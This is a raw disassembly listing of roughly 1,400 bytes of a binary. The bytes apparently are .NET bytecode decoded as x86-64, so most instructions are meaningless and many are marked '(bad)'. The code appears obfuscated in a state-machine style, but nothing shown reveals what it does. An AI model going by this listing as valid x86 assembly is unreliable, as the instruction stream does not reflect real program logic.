  403b7b:	00 00                	add    %al,(%rax)
  403b7d:	20 2e                	and    %ch,(%rsi)
  403b7f:	00 00                	add    %al,(%rax)
  403b81:	00 58 9c             	add    %bl,-0x64(%rax)
  403b84:	20 dd                	and    %bl,%ch
  403b86:	00 00                	add    %al,(%rax)
  403b88:	00 fe                	add    %bh,%dh
  403b8a:	0e                   	(bad)
  403b8b:	33 00                	xor    (%rax),%eax
  403b8d:	38 b9 2d 00 00 39    	cmp    %bh,0x3900002d(%rcx)
  403b93:	cb                   	lret
  403b94:	23 00                	and    (%rax),%eax
  403b96:	00 38                	add    %bh,(%rax)
  403b98:	e4 f8                	in     $0xf8,%al
  403b9a:	ff                   	(bad)
  403b9b:	ff 11                	call   *(%rcx)
  403b9d:	1a 11                	sbb    (%rcx),%dl
  403b9f:	1a 20                	sbb    (%rax),%ah
  403ba1:	29 5d 9c             	sub    %ebx,-0x64(%rbp)
  403ba4:	0c fe                	or     $0xfe,%al
  403ba6:	0e                   	(bad)
  403ba7:	13 00                	adc    (%rax),%eax
  403ba9:	fe 0e                	decb   (%rsi)
  403bab:	0d 00 20 b5 5c       	or     $0x5cb52000,%eax
  403bb0:	0c 19                	or     $0x19,%al
  403bb2:	fe 0e                	decb   (%rsi)
  403bb4:	31 00                	xor    %eax,(%rax)
  403bb6:	20 a8 96 1e 60 fe    	and    %ch,-0x19fe16a(%rax)
  403bbc:	0e                   	(bad)
  403bbd:	04 00                	add    $0x0,%al
  403bbf:	20 8f 25 9c 2b fe    	and    %cl,-0x1d463db(%rdi)
  403bc5:	0e                   	(bad)
  403bc6:	1f                   	(bad)
  403bc7:	00 20                	add    %ah,(%rax)
  403bc9:	1d 40 5c 24 fe       	sbb    $0xfe245c40,%eax
  403bce:	0e                   	(bad)
  403bcf:	26 00 fe             	es add %bh,%dh
  403bd2:	0c 13                	or     $0x13,%al
  403bd4:	00 fe                	add    %bh,%dh
  403bd6:	0c 1f                	or     $0x1f,%al
  403bd8:	00 58 fe             	add    %bl,-0x2(%rax)
  403bdb:	0e                   	(bad)
  403bdc:	13 00                	adc    (%rax),%eax
  403bde:	fe 0c 04             	decb   (%rsp,%rax,1)
  403be1:	00 fe                	add    %bh,%dh
  403be3:	0c 1f                	or     $0x1f,%al
  403be5:	00 59 fe             	add    %bl,-0x2(%rcx)
  403be8:	0e                   	(bad)
  403be9:	04 00                	add    $0x0,%al
  403beb:	fe 0c 31             	decb   (%rcx,%rsi,1)
  403bee:	00 76 6c             	add    %dh,0x6c(%rsi)
  403bf1:	23 00                	and    (%rax),%eax
  403bf3:	00 00                	add    %al,(%rax)
  403bf5:	00 00                	add    %al,(%rax)
  403bf7:	00 00                	add    %al,(%rax)
  403bf9:	00 40 0a             	add    %al,0xa(%rax)
  403bfc:	00 00                	add    %al,(%rax)
  403bfe:	00 fe                	add    %bh,%dh
  403c00:	0c 31                	or     $0x31,%al
  403c02:	00 17                	add    %dl,(%rdi)
  403c04:	59                   	pop    %rcx
  403c05:	fe 0e                	decb   (%rsi)
  403c07:	31 00                	xor    %eax,(%rax)
  403c09:	23 00                	and    (%rax),%eax
  403c0b:	00 00                	add    %al,(%rax)
  403c0d:	e3 03                	jrcxz  0x403c12
  403c0f:	28 c3                	sub    %al,%bl
  403c11:	41 fe 0c 31          	decb   (%r9,%rsi,1)
  403c15:	00 76 6c             	add    %dh,0x6c(%rsi)
  403c18:	5b                   	pop    %rbx
  403c19:	fe 0c 31             	decb   (%rcx,%rsi,1)
  403c1c:	00 76 6c             	add    %dh,0x6c(%rsi)
  403c1f:	58                   	pop    %rax
  403c20:	6d                   	insl   (%dx),(%rdi)
  403c21:	fe 0e                	decb   (%rsi)
  403c23:	12 00                	adc    (%rax),%al
  403c25:	20 90 a2 fd ff fe    	and    %dl,-0x100025e(%rax)
  403c2b:	0c 12                	or     $0x12,%al
  403c2d:	00 61 76             	add    %ah,0x76(%rcx)
  403c30:	6c                   	insb   (%dx),(%rdi)
  403c31:	23 00                	and    (%rax),%eax
  403c33:	00 00                	add    %al,(%rax)
  403c35:	53                   	push   %rbx
  403c36:	61                   	(bad)
  403c37:	6b bf 41 58 6d fe 0e 	imul   $0xe,-0x192a7bf(%rdi),%edi
  403c3e:	31 00                	xor    %eax,(%rax)
  403c40:	20 8f ca 00 00 fe    	and    %cl,-0x1ffff36(%rdi)
  403c46:	0c 04                	or     $0x4,%al
  403c48:	00 20                	add    %ah,(%rax)
  403c4a:	ff                   	(bad)
  403c4b:	ff 00                	incl   (%rax)
  403c4d:	00 5f 5a             	add    %bl,0x5a(%rdi)
  403c50:	fe 0c 04             	decb   (%rsp,%rax,1)
  403c53:	00 1f                	add    %bl,(%rdi)
  403c55:	10 64 58 fe          	adc    %ah,-0x2(%rax,%rbx,2)
  403c59:	0e                   	(bad)
  403c5a:	04 00                	add    $0x0,%al
  403c5c:	20 3d 7f 00 00 fe    	and    %bh,-0x1ffff81(%rip)        # 0xfffffffffe403ce1
  403c62:	0c 13                	or     $0x13,%al
  403c64:	00 20                	add    %ah,(%rax)
  403c66:	ff                   	(bad)
  403c67:	ff 00                	incl   (%rax)
  403c69:	00 5f 5a             	add    %bl,0x5a(%rdi)
  403c6c:	fe 0c 13             	decb   (%rbx,%rdx,1)
  403c6f:	00 1f                	add    %bl,(%rdi)
  403c71:	10 64 59 fe          	adc    %ah,-0x2(%rcx,%rbx,2)
  403c75:	0e                   	(bad)
  403c76:	13 00                	adc    (%rax),%eax
  403c78:	20 7e 65             	and    %bh,0x65(%rsi)
  403c7b:	00 00                	add    %al,(%rax)
  403c7d:	fe 0c 13             	decb   (%rbx,%rdx,1)
  403c80:	00 5a fe             	add    %bl,-0x2(%rdx)
  403c83:	0c 04                	or     $0x4,%al
  403c85:	00 59 fe             	add    %bl,-0x2(%rcx)
  403c88:	0e                   	(bad)
  403c89:	13 00                	adc    (%rax),%eax
  403c8b:	20 25 46 aa 3b 20    	and    %ah,0x203baa46(%rip)        # 0x207be6d7
  403c91:	da 57 6e             	ficoml 0x6e(%rdi)
  403c94:	1c fe                	sbb    $0xfe,%al
  403c96:	0c 13                	or     $0x13,%al
  403c98:	00 59 61             	add    %bl,0x61(%rcx)
  403c9b:	fe 0e                	decb   (%rsi)
  403c9d:	26 00 fe             	es add %bh,%dh
  403ca0:	0c 0d                	or     $0xd,%al
  403ca2:	00 fe                	add    %bh,%dh
  403ca4:	0c 0d                	or     $0xd,%al
  403ca6:	00 19                	add    %bl,(%rcx)
  403ca8:	64 61                	fs (bad)
  403caa:	fe 0e                	decb   (%rsi)
  403cac:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  403cb1:	00 fe                	add    %bh,%dh
  403cb3:	0c 31                	or     $0x31,%al
  403cb5:	00 58 fe             	add    %bl,-0x2(%rax)
  403cb8:	0e                   	(bad)
  403cb9:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  403cbe:	00 fe                	add    %bh,%dh
  403cc0:	0c 0d                	or     $0xd,%al
  403cc2:	00 19                	add    %bl,(%rcx)
  403cc4:	62 61 fe 0e 0d       	(bad) {%k6}
  403cc9:	00 fe                	add    %bh,%dh
  403ccb:	0c 0d                	or     $0xd,%al
  403ccd:	00 fe                	add    %bh,%dh
  403ccf:	0c 1f                	or     $0x1f,%al
  403cd1:	00 58 fe             	add    %bl,-0x2(%rax)
  403cd4:	0e                   	(bad)
  403cd5:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  403cda:	00 fe                	add    %bh,%dh
  403cdc:	0c 0d                	or     $0xd,%al
  403cde:	00 1f                	add    %bl,(%rdi)
  403ce0:	1a 64 61 fe          	sbb    -0x2(%rcx,%riz,2),%ah
  403ce4:	0e                   	(bad)
  403ce5:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  403cea:	00 fe                	add    %bh,%dh
  403cec:	0c 26                	or     $0x26,%al
  403cee:	00 58 fe             	add    %bl,-0x2(%rax)
  403cf1:	0e                   	(bad)
  403cf2:	0d 00 fe 0c 04       	or     $0x40cfe00,%eax
  403cf7:	00 1f                	add    %bl,(%rdi)
  403cf9:	0c 62                	or     $0x62,%al
  403cfb:	fe 0c 13             	decb   (%rbx,%rdx,1)
  403cfe:	00 59 fe             	add    %bl,-0x2(%rcx)
  403d01:	0c 31                	or     $0x31,%al
  403d03:	00 61 fe             	add    %ah,-0x2(%rcx)
  403d06:	0c 0d                	or     $0xd,%al
  403d08:	00 59 fe             	add    %bl,-0x2(%rcx)
  403d0b:	0e                   	(bad)
  403d0c:	0d 00 fe 0c 0d       	or     $0xd0cfe00,%eax
  403d11:	00 76 6c             	add    %dh,0x6c(%rsi)
  403d14:	6d                   	insl   (%dx),(%rdi)
  403d15:	58                   	pop    %rax
  403d16:	13 1a                	adc    (%rdx),%ebx
  403d18:	20 4e 00             	and    %cl,0x0(%rsi)
  403d1b:	00 00                	add    %al,(%rax)
  403d1d:	38 62 f7             	cmp    %ah,-0x9(%rdx)
  403d20:	ff                   	(bad)
  403d21:	ff 20                	jmp    *(%rax)
  403d23:	7a 00                	jp     0x403d25
  403d25:	00 00                	add    %al,(%rax)
  403d27:	20 1f                	and    %bl,(%rdi)
  403d29:	00 00                	add    %al,(%rax)
  403d2b:	00 59 fe             	add    %bl,-0x2(%rcx)
  403d2e:	0e                   	(bad)
  403d2f:	0c 00                	or     $0x0,%al
  403d31:	20 98 00 00 00 fe    	and    %bl,-0x2000000(%rax)
  403d37:	0e                   	(bad)
  403d38:	33 00                	xor    (%rax),%eax
  403d3a:	38 41 f7             	cmp    %al,-0x9(%rcx)
  403d3d:	ff                   	(bad)
  403d3e:	ff                   	(bad)
  403d3f:	fe 0c 27             	decb   (%rdi,%riz,1)
  403d42:	00 20                	add    %ah,(%rax)
  403d44:	0f 00 00             	sldt   (%rax)
  403d47:	00 fe                	add    %bh,%dh
  403d49:	0c 0c                	or     $0xc,%al
  403d4b:	00 9c 20 1d 00 00 00 	add    %bl,0x1d(%rax,%riz,1)
  403d52:	38 2d f7 ff ff fe    	cmp    %ch,-0x1000009(%rip)        # 0xffffffffff403d4f
  403d58:	0c 27                	or     $0x27,%al
  403d5a:	00 20                	add    %ah,(%rax)
  403d5c:	0b 00                	or     (%rax),%eax
  403d5e:	00 00                	add    %al,(%rax)
  403d60:	fe 0c 2b             	decb   (%rbx,%rbp,1)
  403d63:	00 9c 20 e9 00 00 00 	add    %bl,0xe9(%rax,%riz,1)
  403d6a:	38 15 f7 ff ff 20    	cmp    %dl,0x20fffff7(%rip)        # 0x21403d67
  403d70:	c9                   	leave
  403d71:	00 00                	add    %al,(%rax)
  403d73:	00 20                	add    %ah,(%rax)
  403d75:	43 00 00             	rex.XB add %al,(%r8)
  403d78:	00 59 fe             	add    %bl,-0x2(%rcx)
  403d7b:	0e                   	(bad)
  403d7c:	1e                   	(bad)
  403d7d:	00 20                	add    %ah,(%rax)
  403d7f:	0e                   	(bad)
  403d80:	01 00                	add    %eax,(%rax)
  403d82:	00 38                	add    %bh,(%rax)
  403d84:	f4                   	hlt
  403d85:	f6 ff                	idiv   %bh
  403d87:	ff                   	(bad)
  403d88:	fe 0c 27             	decb   (%rdi,%riz,1)
  403d8b:	00 20                	add    %ah,(%rax)
  403d8d:	1e                   	(bad)
  403d8e:	00 00                	add    %al,(%rax)
  403d90:	00 fe                	add    %bh,%dh
  403d92:	0c 2b                	or     $0x2b,%al
  403d94:	00 9c 20 6d 00 00 00 	add    %bl,0x6d(%rax,%riz,1)
  403d9b:	38 dc                	cmp    %bl,%ah
  403d9d:	f6 ff                	idiv   %bh
  403d9f:	ff 20                	jmp    *(%rax)
  403da1:	a5                   	movsl  (%rsi),(%rdi)
  403da2:	00 00                	add    %al,(%rax)
  403da4:	00 20                	add    %ah,(%rax)
  403da6:	37                   	(bad)
  403da7:	00 00                	add    %al,(%rax)
  403da9:	00 59 fe             	add    %bl,-0x2(%rcx)
  403dac:	0e                   	(bad)
  403dad:	2b 00                	sub    (%rax),%eax
  403daf:	20 fe                	and    %bh,%dh
  403db1:	00 00                	add    %al,(%rax)
  403db3:	00 fe                	add    %bh,%dh
  403db5:	0e                   	(bad)
  403db6:	33 00                	xor    (%rax),%eax
  403db8:	16                   	(bad)
  403db9:	39 c2                	cmp    %eax,%edx
  403dbb:	f6 ff                	idiv   %bh
  403dbd:	ff                   	(bad)
  403dbe:	7e 14                	jle    0x403dd4
  403dc0:	00 00                	add    %al,(%rax)
  403dc2:	04 38                	add    $0x38,%al
  403dc4:	8d 2b                	lea    (%rbx),%ebp
  403dc6:	00 00                	add    %al,(%rax)
  403dc8:	38 92 2b 00 00 13    	cmp    %dl,0x1300002b(%rdx)
  403dce:	19 20                	sbb    %esp,(%rax)
  403dd0:	d8 00                	fadds  (%rax)
  403dd2:	00 00                	add    %al,(%rax)
  403dd4:	38 ab f6 ff ff fe    	cmp    %ch,-0x100000a(%rbx)
  403dda:	0c 2f                	or     $0x2f,%al
  403ddc:	00 20                	add    %ah,(%rax)
  403dde:	02 00                	add    (%rax),%al
  403de0:	00 00                	add    %al,(%rax)
  403de2:	fe 0c 0b             	decb   (%rbx,%rcx,1)
  403de5:	00 9c 20 5b 00 00 00 	add    %bl,0x5b(%rax,%riz,1)
  403dec:	38 93 f6 ff ff 20    	cmp    %dl,0x20fffff6(%rbx)
  403df2:	27                   	(bad)
  403df3:	00 00                	add    %al,(%rax)
  403df5:	00 20                	add    %ah,(%rax)
  403df7:	4c 00 00             	rex.WR add %r8b,(%rax)
  403dfa:	00 58 fe             	add    %bl,-0x2(%rax)
  403dfd:	0e                   	(bad)
  403dfe:	2b 00                	sub    (%rax),%eax
  403e00:	20 b1 00 00 00 fe    	and    %dh,-0x2000000(%rcx)
  403e06:	0e                   	(bad)
  403e07:	33 00                	xor    (%rax),%eax
  403e09:	16                   	(bad)
  403e0a:	39 71 f6             	cmp    %esi,-0xa(%rcx)
  403e0d:	ff                   	(bad)
  403e0e:	ff                   	(bad)
  403e0f:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403e12:	00 20                	add    %ah,(%rax)
  403e14:	04 00                	add    $0x0,%al
  403e16:	00 00                	add    %al,(%rax)
  403e18:	fe 0c 1e             	decb   (%rsi,%rbx,1)
  403e1b:	00 9c 20 46 01 00 00 	add    %bl,0x146(%rax,%riz,1)
  403e22:	38 5d f6             	cmp    %bl,-0xa(%rbp)
  403e25:	ff                   	(bad)
  403e26:	ff                   	(bad)
  403e27:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403e2a:	00 20                	add    %ah,(%rax)
  403e2c:	0e                   	(bad)
  403e2d:	00 00                	add    %al,(%rax)
  403e2f:	00 fe                	add    %bh,%dh
  403e31:	0c 1e                	or     $0x1e,%al
  403e33:	00 9c 20 44 01 00 00 	add    %bl,0x144(%rax,%riz,1)
  403e3a:	fe 0e                	decb   (%rsi)
  403e3c:	33 00                	xor    (%rax),%eax
  403e3e:	38 3d f6 ff ff 11    	cmp    %bh,0x11fffff6(%rip)        # 0x12403e3a
  403e44:	24 8e                	and    $0x8e,%al
  403e46:	69 8d 11 00 00 01 13 	imul   $0xf1200813,0x1000011(%rbp),%ecx
  403e4d:	08 20 f1 
  403e50:	00 00                	add    %al,(%rax)
  403e52:	00 fe                	add    %bh,%dh
  403e54:	0e                   	(bad)
  403e55:	33 00                	xor    (%rax),%eax
  403e57:	38 24 f6             	cmp    %ah,(%rsi,%rsi,8)
  403e5a:	ff                   	(bad)
  403e5b:	ff 16                	call   *(%rsi)
  403e5d:	13 28                	adc    (%rax),%ebp
  403e5f:	20 11                	and    %dl,(%rcx)
  403e61:	01 00                	add    %eax,(%rax)
  403e63:	00 38                	add    %bh,(%rax)
  403e65:	1b f6                	sbb    %esi,%esi
  403e67:	ff                   	(bad)
  403e68:	ff                   	(bad)
  403e69:	fe 0c 27             	decb   (%rdi,%riz,1)
  403e6c:	00 20                	add    %ah,(%rax)
  403e6e:	19 00                	sbb    %eax,(%rax)
  403e70:	00 00                	add    %al,(%rax)
  403e72:	20 b3 00 00 00 20    	and    %dh,0x20000000(%rbx)
  403e78:	3b 00                	cmp    (%rax),%eax
  403e7a:	00 00                	add    %al,(%rax)
  403e7c:	59                   	pop    %rcx
  403e7d:	9c                   	pushf
  403e7e:	20 c5                	and    %al,%ch
  403e80:	00 00                	add    %al,(%rax)
  403e82:	00 fe                	add    %bh,%dh
  403e84:	0e                   	(bad)
  403e85:	33 00                	xor    (%rax),%eax
  403e87:	17                   	(bad)
  403e88:	3a f3                	cmp    %bl,%dh
  403e8a:	f5                   	cmc
  403e8b:	ff                   	(bad)
  403e8c:	ff                   	(bad)
  403e8d:	fe 0c 27             	decb   (%rdi,%riz,1)
  403e90:	00 20                	add    %ah,(%rax)
  403e92:	04 00                	add    $0x0,%al
  403e94:	00 00                	add    %al,(%rax)
  403e96:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  403e99:	00 9c 20 ab 01 00 00 	add    %bl,0x1ab(%rax,%riz,1)
  403ea0:	38 d7                	cmp    %dl,%bh
  403ea2:	f5                   	cmc
  403ea3:	ff                   	(bad)
  403ea4:	ff                   	(bad)
  403ea5:	fe 0c 27             	decb   (%rdi,%riz,1)
  403ea8:	00 20                	add    %ah,(%rax)
  403eaa:	1f                   	(bad)
  403eab:	00 00                	add    %al,(%rax)
  403ead:	00 fe                	add    %bh,%dh
  403eaf:	0c 2b                	or     $0x2b,%al
  403eb1:	00 9c 20 0a 00 00 00 	add    %bl,0xa(%rax,%riz,1)
  403eb8:	fe 0e                	decb   (%rsi)
  403eba:	33 00                	xor    (%rax),%eax
  403ebc:	38 bf f5 ff ff 11    	cmp    %bh,0x11fffff5(%rdi)
  403ec2:	2c 11                	sub    $0x11,%al
  403ec4:	1d 3f bc 01 00       	sbb    $0x1bc3f,%eax
  403ec9:	00 20                	add    %ah,(%rax)
  403ecb:	83 00 00             	addl   $0x0,(%rax)
  403ece:	00 38                	add    %bh,(%rax)
  403ed0:	a8 f5                	test   $0xf5,%al
  403ed2:	ff                   	(bad)
  403ed3:	ff                   	(bad)
  403ed4:	fe 0c 27             	decb   (%rdi,%riz,1)
  403ed7:	00 20                	add    %ah,(%rax)
  403ed9:	1c 00                	sbb    $0x0,%al
  403edb:	00 00                	add    %al,(%rax)
  403edd:	20 71 00             	and    %dh,0x0(%rcx)
  403ee0:	00 00                	add    %al,(%rax)
  403ee2:	20 56 00             	and    %dl,0x0(%rsi)
  403ee5:	00 00                	add    %al,(%rax)
  403ee7:	58                   	pop    %rax
  403ee8:	9c                   	pushf
  403ee9:	20 a2 00 00 00 38    	and    %ah,0x38000000(%rdx)
  403eef:	89 f5                	mov    %esi,%ebp
  403ef1:	ff                   	(bad)
  403ef2:	ff                   	(bad)
  403ef3:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403ef6:	00 20                	add    %ah,(%rax)
  403ef8:	08 00                	or     %al,(%rax)
  403efa:	00 00                	add    %al,(%rax)
  403efc:	20 a9 00 00 00 20    	and    %ch,0x20000000(%rcx)
  403f02:	38 00                	cmp    %al,(%rax)
  403f04:	00 00                	add    %al,(%rax)
  403f06:	59                   	pop    %rcx
  403f07:	9c                   	pushf
  403f08:	20 1d 01 00 00 fe    	and    %bl,-0x1ffffff(%rip)        # 0xfffffffffe403f0f
  403f0e:	0e                   	(bad)
  403f0f:	33 00                	xor    (%rax),%eax
  403f11:	38 53 2a             	cmp    %dl,0x2a(%rbx)
  403f14:	00 00                	add    %al,(%rax)
  403f16:	39 40 28             	cmp    %eax,0x28(%rax)
  403f19:	00 00                	add    %al,(%rax)
  403f1b:	38 60 f5             	cmp    %ah,-0xb(%rax)
  403f1e:	ff                   	(bad)
  403f1f:	ff                   	(bad)
  403f20:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403f23:	00 20                	add    %ah,(%rax)
  403f25:	06                   	(bad)
  403f26:	00 00                	add    %al,(%rax)
  403f28:	00 fe                	add    %bh,%dh
  403f2a:	0c 0b                	or     $0xb,%al
  403f2c:	00 9c 20 21 01 00 00 	add    %bl,0x121(%rax,%riz,1)
  403f33:	38 44 f5 ff          	cmp    %al,-0x1(%rbp,%rsi,8)
  403f37:	ff 20                	jmp    *(%rax)
  403f39:	e0 00                	loopne 0x403f3b
  403f3b:	00 00                	add    %al,(%rax)
  403f3d:	20 4a 00             	and    %cl,0x0(%rdx)
  403f40:	00 00                	add    %al,(%rax)
  403f42:	59                   	pop    %rcx
  403f43:	fe 0e                	decb   (%rsi)
  403f45:	0c 00                	or     $0x0,%al
  403f47:	20 ed                	and    %ch,%ch
  403f49:	00 00                	add    %al,(%rax)
  403f4b:	00 fe                	add    %bh,%dh
  403f4d:	0e                   	(bad)
  403f4e:	33 00                	xor    (%rax),%eax
  403f50:	38 2b                	cmp    %ch,(%rbx)
  403f52:	f5                   	cmc
  403f53:	ff                   	(bad)
  403f54:	ff 20                	jmp    *(%rax)
  403f56:	7e 00                	jle    0x403f58
  403f58:	00 00                	add    %al,(%rax)
  403f5a:	20 2a                	and    %ch,(%rdx)
  403f5c:	00 00                	add    %al,(%rax)
  403f5e:	00 59 fe             	add    %bl,-0x2(%rcx)
  403f61:	0e                   	(bad)
  403f62:	2b 00                	sub    (%rax),%eax
  403f64:	20 71 01             	and    %dh,0x1(%rcx)
  403f67:	00 00                	add    %al,(%rax)
  403f69:	fe 0e                	decb   (%rsi)
  403f6b:	33 00                	xor    (%rax),%eax
  403f6d:	38 0e                	cmp    %cl,(%rsi)
  403f6f:	f5                   	cmc
  403f70:	ff                   	(bad)
  403f71:	ff 11                	call   *(%rcx)
  403f73:	00 38                	add    %bh,(%rax)
  403f75:	fa                   	cli
  403f76:	29 00                	sub    %eax,(%rax)
  403f78:	00 20                	add    %ah,(%rax)
  403f7a:	15 00 00 00 fe       	adc    $0xfe000000,%eax
  403f7f:	0e                   	(bad)
  403f80:	33 00                	xor    (%rax),%eax
  403f82:	38 f9                	cmp    %bh,%cl
  403f84:	f4                   	hlt
  403f85:	ff                   	(bad)
  403f86:	ff                   	(bad)
  403f87:	fe 0c 27             	decb   (%rdi,%riz,1)
  403f8a:	00 20                	add    %ah,(%rax)
  403f8c:	15 00 00 00 fe       	adc    $0xfe000000,%eax
  403f91:	0c 2b                	or     $0x2b,%al
  403f93:	00 9c 20 47 01 00 00 	add    %bl,0x147(%rax,%riz,1)
  403f9a:	38 e5                	cmp    %ah,%ch
  403f9c:	f4                   	hlt
  403f9d:	ff                   	(bad)
  403f9e:	ff                   	(bad)
  403f9f:	fe 0c 27             	decb   (%rdi,%riz,1)
  403fa2:	00 20                	add    %ah,(%rax)
  403fa4:	00 00                	add    %al,(%rax)
  403fa6:	00 00                	add    %al,(%rax)
  403fa8:	20 26                	and    %ah,(%rsi)
  403faa:	00 00                	add    %al,(%rax)
  403fac:	00 20                	add    %ah,(%rax)
  403fae:	05 00 00 00 58       	add    $0x58000000,%eax
  403fb3:	9c                   	pushf
  403fb4:	20 0f                	and    %cl,(%rdi)
  403fb6:	01 00                	add    %eax,(%rax)
  403fb8:	00 38                	add    %bh,(%rax)
  403fba:	c6                   	(bad)
  403fbb:	f4                   	hlt
  403fbc:	ff                   	(bad)
  403fbd:	ff                   	(bad)
  403fbe:	fe 0c 27             	decb   (%rdi,%riz,1)
  403fc1:	00 20                	add    %ah,(%rax)
  403fc3:	0e                   	(bad)
  403fc4:	00 00                	add    %al,(%rax)
  403fc6:	00 fe                	add    %bh,%dh
  403fc8:	0c 0c                	or     $0xc,%al
  403fca:	00 9c 20 48 01 00 00 	add    %bl,0x148(%rax,%riz,1)
  403fd1:	fe 0e                	decb   (%rsi)
  403fd3:	33 00                	xor    (%rax),%eax
  403fd5:	38 a3 29 00 00 39    	cmp    %ah,0x39000029(%rbx)
  403fdb:	8f                   	(bad)
  403fdc:	1a 00                	sbb    (%rax),%al
  403fde:	00 38                	add    %bh,(%rax)
  403fe0:	9c                   	pushf
  403fe1:	f4                   	hlt
  403fe2:	ff                   	(bad)
  403fe3:	ff                   	(bad)
  403fe4:	fe 0c 2f             	decb   (%rdi,%rbp,1)
  403fe7:	00 20                	add    %ah,(%rax)
  403fe9:	05 00 00 00 20       	add    $0x20000000,%eax
  403fee:	91                   	xchg   %eax,%ecx
  403fef:	00 00                	add    %al,(%rax)
  403ff1:	00 20                	add    %ah,(%rax)
  403ff3:	19 00                	sbb    %eax,(%rax)
  403ff5:	00 00                	add    %al,(%rax)
  403ff7:	59                   	pop    %rcx
  403ff8:	9c                   	pushf
  403ff9:	20 fb                	and    %bh,%bl
  403ffb:	00 00                	add    %al,(%rax)
  403ffd:	00 38                	add    %bh,(%rax)
  403fff:	81 f4 ff ff 11 08    	xor    $0x811ffff,%esp
  404005:	11 14 11             	adc    %edx,(%rcx,%rdx,1)
  404008:	1b 58 11             	sbb    0x11(%rax),%ebx
  40400b:	11 11                	adc    %edx,(%rcx)
  40400d:	02 5f 11             	add    0x11(%rdi),%bl
  404010:	16                   	(bad)
  404011:	1f                   	(bad)
  404012:	1f                   	(bad)
  404013:	5f                   	pop    %rdi
  404014:	64 d2 9c 20 23 01 00 	rcrb   %cl,%fs:0x123(%rax,%riz,1)
  40401b:	00 
  40401c:	fe 0e                	decb   (%rsi)
  40401e:	33 00                	xor    (%rax),%eax
  404020:	38 5b f4             	cmp    %bl,-0xc(%rbx)
  404023:	ff                   	(bad)
  404024:	ff 20                	jmp    *(%rax)
  404026:	82                   	(bad)
  404027:	00 00                	add    %al,(%rax)
  404029:	00 20                	add    %ah,(%rax)
  40402b:	09 00                	or     %eax,(%rax)
  40402d:	00 00                	add    %al,(%rax)
  40402f:	58                   	pop    %rax
  404030:	fe 0e                	decb   (%rsi)
  404032:	2b 00                	sub    (%rax),%eax
  404034:	20 c0                	and    %al,%al
  404036:	00 00                	add    %al,(%rax)
  404038:	00 38                	add    %bh,(%rax)
  40403a:	3e f4                	ds hlt
  40403c:	ff                   	(bad)
  40403d:	ff 20                	jmp    *(%rax)
  40403f:	9c                   	pushf
  404040:	00 00                	add    %al,(%rax)
  404042:	00 20                	add    %ah,(%rax)
  404044:	34 00                	xor    $0x0,%al
  404046:	00 00                	add    %al,(%rax)
  404048:	59                   	pop    %rcx
  404049:	fe 0e                	decb   (%rsi)
  40404b:	1e                   	(bad)
  40404c:	00 20                	add    %ah,(%rax)
  40404e:	14 00                	adc    $0x0,%al
  404050:	00 00                	add    %al,(%rax)
  404052:	fe 0e                	decb   (%rsi)
  404054:	33 00                	xor    (%rax),%eax
  404056:	38 25 f4 ff ff 16    	cmp    %ah,0x16fffff4(%rip)        # 0x17404050
  40405c:	13 0a                	adc    (%rdx),%ecx
  40405e:	20 96 01 00 00 38    	and    %dl,0x38000001(%rsi)
  404064:	14 f4                	adc    $0xf4,%al
  404066:	ff                   	(bad)
  404067:	ff 20                	jmp    *(%rax)
  404069:	6c                   	insb   (%dx),(%rdi)
  40406a:	00 00                	add    %al,(%rax)
  40406c:	00 20                	add    %ah,(%rax)
  40406e:	63 00                	movsxd (%rax),%eax
  404070:	00 00                	add    %al,(%rax)
  404072:	58                   	pop    %rax
  404073:	fe 0e                	decb   (%rsi)
  404075:	1e                   	(bad)
  404076:	00 20                	add    %ah,(%rax)
  404078:	7a 01                	jp     0x40407b
  40407a:	00 00                	add    %al,(%rax)
  40407c:	38 03                	cmp    %al,(%rbx)
  40407e:	f4                   	hlt
  40407f:	ff                   	(bad)
  404080:	ff                   	(bad)
  404081:	38 3b                	cmp    %bh,(%rbx)
  404083:	fe                   	(bad)
  404084:	ff                   	(bad)
  404085:	ff 11                	call   *(%rcx)
  404087:	2c 16                	sub    $0x16,%al
  404089:	3e 04 09             	ds add $0x9,%al
  40408c:	00 00                	add    %al,(%rax)
  40408e:	20 80 00 00 00 38    	and    %al,0x38000000(%rax)
  404094:	ec                   	in     (%dx),%al
  404095:	f3 ff                	repz (bad)
  404097:	ff                   	(bad)
  404098:	fe 0c 27             	decb   (%rdi,%riz,1)
  40409b:	00 20                	add    %ah,(%rax)
  40409d:	1a 00                	sbb    (%rax),%al
  40409f:	00 00                	add    %al,(%rax)
  4040a1:	fe 0c 0c             	decb   (%rsp,%rcx,1)
  4040a4:	00 9c 20 4d 01 00 00 	add    %bl,0x14d(%rax,%riz,1)
  4040ab:	38 cc                	cmp    %cl,%ah
  4040ad:	f3 ff                	repz (bad)
  4040af:	ff 11                	call   *(%rcx)
  4040b1:	20 38                	and    %bh,(%rax)
  4040b3:	d0 28                	shrb   $1,(%rax)
  4040b5:	00 00                	add    %al,(%rax)
  4040b7:	20 7c 00 00          	and    %bh,0x0(%rax,%rax,1)
  4040bb:	00 fe                	add    %bh,%dh
  4040bd:	0e                   	(bad)
  4040be:	33 00                	xor    (%rax),%eax
  4040c0:	17                   	(bad)
  4040c1:	3a ba f3 ff ff 20    	cmp    0x20fffff3(%rdx),%bh
  4040c7:	ff 00                	incl   (%rax)
  4040c9:	00 00                	add    %al,(%rax)
  4040cb:	13 02                	adc    (%rdx),%eax
  4040cd:	20 16                	and    %dl,(%rsi)
  4040cf:	00 00                	add    %al,(%rax)
  4040d1:	00 fe                	add    %bh,%dh
  4040d3:	0e                   	(bad)
  4040d4:	33 00                	xor    (%rax),%eax
  4040d6:	38 b6 28 00 00 39    	cmp    %dh,0x39000028(%rsi)
  4040dc:	2c 0c                	sub    $0xc,%al
  4040de:	00 00                	add    %al,(%rax)
  4040e0:	38 9b f3 ff ff 20    	cmp    %bl,0x20fffff3(%rbx)
  4040e6:	ae                   	scas   (%rdi),%al
  4040e7:	00 00                	add    %al,(%rax)
  4040e9:	00 20                	add    %ah,(%rax)
  4040eb:	47 00 00             	rex.RXB add %r8b,(%r8)
  4040ee:	00 59 fe             	add    %bl,-0x2(%rcx)
